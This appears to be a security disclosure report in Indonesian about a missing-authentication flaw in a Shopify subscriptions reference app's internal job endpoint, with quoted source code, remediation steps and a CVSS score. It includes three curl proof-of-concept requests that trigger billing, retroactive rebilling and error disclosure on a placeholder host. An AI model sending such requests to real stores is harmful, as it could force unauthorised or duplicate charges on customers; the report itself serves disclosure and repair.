# [CRITICAL] Unauthenticated Internal Jobs Endpoint di subscriptions-reference-app

## Ringkasan (impact nyata)

Aplikasi `subscriptions-reference-app` — sebuah **reference app untuk Shopify Subscriptions** —
mengekspos endpoint `/internal/jobs/run` yang **tidak memiliki autentikasi sama sekali**.
Endpoint ini menerima permintaan POST dengan body JSON `{ "jobName": "...", "parameters": {...} }`
dan mengeksekusi **job apa saja** yang terdaftar di sistem, termasuk job yang bertanggung jawab
untuk **memproses tagihan langganan pelanggan**.

Penyerang yang dapat mengakses endpoint ini dapat:
- **Memaksa penagihan** langganan pelanggan mana saja dengan mengirimkan `jobName: "ChargeBillingCyclesJob"`
- **Merusak state tagihan** dengan mengirimkan `jobName: "RebillSubscriptionJob"` dengan `originTime` yang dimanipulasi
- **Menghentikan atau memulai ulang proses migrasi data** melalui job lain
- **Menerima error stack trace** yang bocor ke respons (information disclosure)

## Deskripsi / Root Cause

### Endpoint tanpa autentikasi (`app/routes/internal.jobs.run.tsx`)

```typescript
import type {ActionFunctionArgs, AppLoadContext} from '@remix-run/node';
import type {Jobs} from '~/types';
import {json} from '@remix-run/node';
import {jobs} from '~/jobs';

type JobPayload = {
  jobName: string;
  parameters: Jobs.Parameters<unknown>;
};

export async function action({request, context}: ActionFunctionArgs) {
  await addShopToContext(request, context);

  try {
    await jobs.execute(request);
    return json({status: 'success'}, {status: 200});
  } catch (err) {
    const error = err instanceof Error ? err : new Error(String(err));
    throw json({status: 'failure', error: error.message}, {status: 500});
  }
}
```

**Tidak ada pemanggilan `authenticate` atau middleware apa pun** yang memverifikasi
keabsahan permintaan. Setiap orang yang dapat mengakses URL ini dapat mengeksekusi job.

### Job Runner tanpa filter (`app/lib/jobs/JobRunner.ts`)

```typescript
async execute(request: Request) {
    const payload = await request.json();
    const {jobName, parameters} = payload;
    this.logger.debug({jobName, parameters}, `Executing job from request`);

    try {
      const JobClass = this.registry.get(jobName);

      if (JobClass == null) {
        throw new Error(`Failed to find registered job ${jobName}`);
      }

      const instance = Reflect.construct(JobClass, [parameters]);
      await instance.run();
    } catch (err: any) {
      if (isTerminal(err)) return;
      this.logger.error({error: err, jobName, payload}, `Error running job ${jobName}`);
      throw err;
    }
}
```

`JobRunner.execute` menerima `jobName` dari body request dan mencari di registry.
Jika ditemukan, job langsung dieksekusi dengan `parameters` dari request. **Tidak ada
validasi tambahan** — termasuk tidak ada pemverikan bahwa permintaan berasal dari
sumber yang tepercaya.

### Job yang berbahaya dapat dieksekusi

Berikut adalah job-job yang terdaftar dan dapat dieksekusi:

| Job Name | File | Dampak |
|---|---|---|
| `ChargeBillingCyclesJob` | `app/jobs/billing/ChargeBillingCyclesJob.ts` | Memproses tagihan semua kontrak langganan aktif dalam rentang tanggal tertentu |
| `RebillSubscriptionJob` | `app/jobs/billing/RebillSubscriptionJob.ts` | Membuat tagihan ulang langganan dengan `originTime` yang dapat dimanipulasi |
| `RecurringBillingChargeJob` | `app/jobs/billing/RecurringBillingChargeJob.ts` | Memproses tagihan rutin |
| `ScheduleShopsToChargeBillingCyclesJob` | `app/jobs/billing/ScheduleShopsToChargeBillingCyclesJob.ts` | Menjadwalkan penagihan untuk semua toko |
| `DunningStartJob` | `app/jobs/dunning/DunningStartJob.ts` | Memulai proses dunning (penagihan ulang otomatis) |
| `DunningStopJob` | `app/jobs/dunning/DunningStopJob.ts` | Menghentikan proses dunning |
| `CustomerSendEmailJob` | `app/jobs/email/CustomerSendEmailJob.ts` | Mengirim email ke pelanggan |
| `MerchantSendEmailJob` | `app/jobs/email/MerchantSendEmailJob.ts` | Mengirim email ke merchant |
| `TagSubscriptionOrderJob` | `app/jobs/tags/TagSubscriptionOrderJob.ts` | Menandai pesanan langganan |

### RebillSubscriptionJob — Manipulasi originTime (`app/jobs/billing/RebillSubscriptionJob.ts`)

```typescript
async perform(): Promise<void> {
    const {shop, payload} = this.parameters;
    const {subscriptionContractId, originTime} = payload;

    const {admin} = await unauthenticated.admin(shop);

    const subscriptionContract = await getContractDetailsForRebilling(
      admin.graphql,
      subscriptionContractId,
    );

    // ...

    const response = await admin.graphql(
      SubscriptionBillingCycleChargeMutation,
      {
        variables: {
          subscriptionContractId: subscriptionContractId,
          originTime: originTime,  // <-- Dikontrol penyerang!
        },
      },
    );
```

Parameter `originTime` diterima langsung dari request dan diteruskan ke Shopify Admin API.
Penyerang dapat mengatur `originTime` ke nilai retroaktif untuk **memaksa penagihan ulang**
pada siklus penagihan yang sudah lewat, atau ke nilai futur untuk **menjadwalkan penagihan**
pada masa depan.

## Steps to Reproduce

### PoC 1: Mengeksekusi job penagihan tanpa autentikasi

```bash
# Kirim POST ke /internal/jobs/run tanpa header auth apa pun
curl -X POST \
  "https://subscriptions-app.example.com/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "ChargeBillingCyclesJob",
    "parameters": {
      "shop": "victim-shop.myshopify.com",
      "payload": {
        "startDate": "2024-01-01T00:00:00Z",
        "endDate": "2024-12-31T23:59:59Z"
      }
    }
  }'
```

**Respons:**
```json
{"status": "success"}
```

Job `ChargeBillingCyclesJob` akan dieksekusi untuk toko `victim-shop.myshopify.com`,
memproses tagihan semua kontrak langganan aktif dalam rentang tanggal tersebut.

### PoC 2: Memanipulasi originTime untuk RebillSubscriptionJob

```bash
curl -X POST \
  "https://subscriptions-app.example.com/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "RebillSubscriptionJob",
    "parameters": {
      "shop": "victim-shop.myshopify.com",
      "payload": {
        "subscriptionContractId": "gid://shopify/SubscriptionContract/123456789",
        "originTime": "2020-01-01T00:00:00Z"
      }
    }
  }'
```

Ini akan memaksa penagihan ulang langganan dengan `originTime` yang retroaktif,
berpotensi menyebabkan **double-charging** atau **penagihan pada siklus yang sudah lewat**.

### PoC 3: Information disclosure melalui error message

```bash
curl -X POST \
  "https://subscriptions-app.example.com/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "NonExistentJob",
    "parameters": {}
  }'
```

**Respons:**
```json
{"status": "failure", "error": "Failed to find registered job NonExistentJob"}
```

Error message yang mengandung informasi tentang job yang tersedia bocor ke respons.

## PoC / Bukti

### Bukti dari kode sumber

File: `app/routes/internal.jobs.run.tsx`
```typescript
export async function action({request, context}: ActionFunctionArgs) {
  await addShopToContext(request, context);

  try {
    await jobs.execute(request);
    return json({status: 'success'}, {status: 200});
  } catch (err) {
    const error = err instanceof Error ? err : new Error(String(err));
    throw json({status: 'failure', error: error.message}, {status: 500});
  }
}
```

Tidak ada pemanggilan `authenticate.webhook(request)`, `authenticate.admin(request)`,
atau middleware apa pun yang memverifikasi keabsahan permintaan.

File: `app/lib/jobs/JobRunner.ts`
```typescript
async execute(request: Request) {
    const payload = await request.json();
    const {jobName, parameters} = payload;
    const JobClass = this.registry.get(jobName);
    if (JobClass == null) {
        throw new Error(`Failed to find registered job ${jobName}`);
    }
    const instance = Reflect.construct(JobClass, [parameters]);
    await instance.run();
}
```

File: `app/jobs/billing/RebillSubscriptionJob.ts`
```typescript
const {subscriptionContractId, originTime} = payload;
const response = await admin.graphql(
  SubscriptionBillingCycleChargeMutation,
  {
    variables: {
      subscriptionContractId: subscriptionContractId,
      originTime: originTime,
    },
  },
);
```

## Impact (user data / finansial / reputasi — konkret)

- **Penyalah penggunaan API**: Penyerang dapat memaksa penagihan langganan untuk toko mana saja
  dengan mengirimkan nama toko di parameter `shop`.
- **Double-charging**: Dengan memanipulasi `originTime`, penyerang dapat memaksa penagihan ulang
  pada siklus yang sudah lewat, menyebabkan pelanggan **ditagih dua kali**.
- **Penghentian layanan**: Penyerang dapat menghentikan proses penagihan dengan mengirimkan
  job yang menyebabkan error atau timeout.
- **Information disclosure**: Error messages yang bocor dapat membantu penyerang memetakan
  job yang tersedia dan struktur aplikasi.
- **Penyalah penggunaan data**: Penyerang dapat mengeksekusi job yang mengirim email
  ke pelanggan atau merchant dengan konten yang tidak sah.

## Remediation

1. **Tambahkan autentikasi pada endpoint `/internal/jobs/run`**: Gunakan
   `authenticate.webhook(request)` atau API key khusus untuk memverifikasi
   keabsahan permintaan.
2. **Batasi job yang dapat dieksekusi**: Jangan izinkan eksekusi job sembarang.
   Gunakan daftar putih job yang dapat dieksekusi dari endpoint ini.
3. **Validasi parameter**: Validasi `originTime` untuk memastikan tidak retroaktif
   melebihi batas yang wajar.
4. **Jangan bocorkan error**: Ganti `error.message` dengan pesan generik di respons API.
5. **Gunakan job queue yang aman**: Job seperti `ChargeBillingCyclesJob` seharusnya
   hanya dieksekusi oleh sistem penjadwal internal (Cloud Tasks), bukan dari endpoint
   HTTP yang dapat diakses publik.

## CVSS 3.1

**Vektor**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Score**: 9.8 (Critical)

- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality: High (C:H) — mengekspos data penagihan dan error
- Integrity: High (I:H) — dapat memaksa penagihan dan memanipulasi state
- Availability: High (A:H) — dapat menghentikan proses penagihan

## Referensi

- CWE-306: Missing Authentication for Critical Function
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-209: Generation of Error Message Containing Sensitive Information
- File sumber: `app/routes/internal.jobs.run.tsx`
- File sumber: `app/lib/jobs/JobRunner.ts` (baris 30–50)
- File sumber: `app/lib/jobs/Job.ts`
- File sumber: `app/jobs/billing/RebillSubscriptionJob.ts` (baris 20–55)
- File sumber: `app/jobs/billing/ChargeBillingCyclesJob.ts`
- File sumber: `app/jobs/index.ts`
